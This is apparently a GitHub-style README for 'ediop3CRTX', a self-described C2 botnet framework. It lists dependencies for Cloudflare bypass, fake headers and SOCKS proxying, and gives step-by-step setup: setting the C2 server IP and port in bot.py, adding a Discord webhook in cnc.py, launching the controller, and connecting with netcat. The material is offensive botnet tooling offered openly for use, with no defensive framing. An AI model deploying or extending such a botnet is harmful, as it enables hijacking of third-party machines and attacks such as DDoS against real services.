# ediop3CRTX
Another C2 framework (rn I created 2 c2 botnets lmao)

pip install cryptography
pip install fake_useragent
pip install fake_headers
pip install fake-headers
pip install cfscrape
pip install cloudscraper
pip install requests
pip install ipaddress
pip install discord-webhook
pip install PySocks

# change #
you can change ip and port in bot.py
if you change the botnet port. change port in cnc.py too

EXAMPLE CHANGE

bot.py (file)
+-------------------------------+
C2_ADDRESS  = "1.1.1.1" <--- change c2 sevrer (if not localhost)
C2_PORT     = 8185
+--------------------------------+

c2.py (command)
screen python3 cnc.py 8185
python3 cnc.py 8185

EXAMPLE CONNECTING IF YOU CHANGE IP IN bot.py

  1.1.1.1 = c2 server ip
127.0.0.1 = localhost ip
192.0.0.1 = other computer ip

127.0.0.1 ---> 1.1.1.1 |    bot = show    | in ip localhost computer/notebook/vpn
192.0.0.1 ---> 1.1.1.1 |    bot = show    | not ip localhost computer/notebook/vpn
  1.1.1.1 ---> 1.1.1.1 | bot = can't show | because can't connect

# VSCODE / NOTEPAD / TERMUX / KALI EDITORS WORK TOO.#
vscode/notepad/termux/kali editor | and next you open in cnc.py and saw this OTP_WEB = "" replace this with OTP_WEB = "link_webhook_discord"


After that run python3 cnc.py 8185 (replace 8185 with port u use in botnet.py and cnc)
putty isn't required open a new tab and type nc 192.168.x.x 8185 replace the ip and port with any valid localhost or ip.
and then it's ready to go.
